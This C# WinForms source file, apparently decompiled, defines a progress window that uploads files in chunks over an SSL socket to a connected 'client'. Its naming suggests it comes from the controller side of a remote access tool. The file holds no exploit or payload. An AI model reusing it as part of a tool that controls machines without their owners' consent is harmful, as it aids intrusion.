using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using DevExpress.XtraEditors;
using Server.Connection;
using Server.Helper;

namespace Server.Forms;

public class FormDownloadFile : XtraForm
{
	public long FileSize;

	private long BytesSent;

	public string FullFileName;

	public string ClientFullFileName;

	private bool IsUpload;

	public string DirPath;

	private IContainer components;

	public Timer timer1;

	public Label labelsize;

	private Label label3;

	public Label labelfile;

	public Label label1;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	public FormDownloadFile()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (FileSize >= int.MaxValue)
		{
			timer1.Stop();
			MessageBox.Show("Don't support files larger than 2GB.");
			Dispose();
		}
		else if (!IsUpload)
		{
			labelsize.Text = Methods.BytesToString(FileSize) + " \\ " + Methods.BytesToString(Client.BytesRecevied);
			if (Client.BytesRecevied >= FileSize)
			{
				labelsize.Text = "Downloaded";
				labelsize.ForeColor = Color.Green;
				timer1.Stop();
			}
		}
		else
		{
			labelsize.Text = Methods.BytesToString(FileSize) + " \\ " + Methods.BytesToString(BytesSent);
			if (BytesSent >= FileSize)
			{
				labelsize.Text = "Uploaded";
				labelsize.ForeColor = Color.Green;
				timer1.Stop();
			}
		}
	}

	private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			Client?.Disconnected();
			timer1?.Dispose();
		}
		catch
		{
		}
	}

	public void Send(object obj)
	{
		lock (Client.SendSync)
		{
			try
			{
				IsUpload = true;
				byte[] obj2 = (byte[])obj;
				byte[] bytes = BitConverter.GetBytes(obj2.Length);
				Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
				Client.SslClient.Write(bytes, 0, bytes.Length);
				using (MemoryStream memoryStream = new MemoryStream(obj2))
				{
					int num = 0;
					memoryStream.Position = 0L;
					byte[] array = new byte[50000];
					while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
					{
						Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
						Client.SslClient.Write(array, 0, num);
						BytesSent += num;
					}
				}
				Program.mainform.BeginInvoke((MethodInvoker)delegate
				{
					Close();
				});
			}
			catch
			{
				Client?.Disconnected();
				Program.mainform.BeginInvoke((MethodInvoker)delegate
				{
					labelsize.Text = "Error";
					labelsize.ForeColor = Color.Red;
				});
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormDownloadFile));
		this.label1 = new System.Windows.Forms.Label();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.labelsize = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.labelfile = new System.Windows.Forms.Label();
		base.SuspendLayout();
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(9, 73);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(76, 16);
		this.label1.TabIndex = 0;
		this.label1.Text = "Downloaad:";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.labelsize.AutoSize = true;
		this.labelsize.Location = new System.Drawing.Point(80, 73);
		this.labelsize.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelsize.Name = "labelsize";
		this.labelsize.Size = new System.Drawing.Size(16, 16);
		this.labelsize.TabIndex = 0;
		this.labelsize.Text = "..";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(9, 31);
		this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(33, 16);
		this.label3.TabIndex = 0;
		this.label3.Text = "File:";
		this.labelfile.AutoSize = true;
		this.labelfile.Location = new System.Drawing.Point(80, 31);
		this.labelfile.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelfile.Name = "labelfile";
		this.labelfile.Size = new System.Drawing.Size(16, 16);
		this.labelfile.TabIndex = 0;
		this.labelfile.Text = "..";
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(478, 122);
		base.Controls.Add(this.labelfile);
		base.Controls.Add(this.labelsize);
		base.Controls.Add(this.label3);
		base.Controls.Add(this.label1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormDownloadFile.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormDownloadFile.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "FormDownloadFile";
		this.Text = "Download";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(SocketDownload_FormClosed);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
